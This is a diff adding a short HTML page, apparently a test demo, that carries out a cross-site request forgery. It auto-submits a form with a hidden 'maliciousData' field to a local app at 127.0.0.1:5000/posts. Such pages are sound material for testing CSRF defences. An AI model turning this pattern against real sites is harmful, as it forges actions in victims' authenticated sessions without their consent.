@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Demo Page</title>
+</head>
+<body>
+    <h1>Test CSRF Attack</h1>
+    <form action="http://127.0.0.1:5000/posts" method="post" id="csrf-form">
+        <input type="hidden" name="message" value="maliciousData">
+        <button type="button" onclick="document.getElementById('csrf-form').submit();">Click Me</button>
+    </form>
+</body>
+</html>
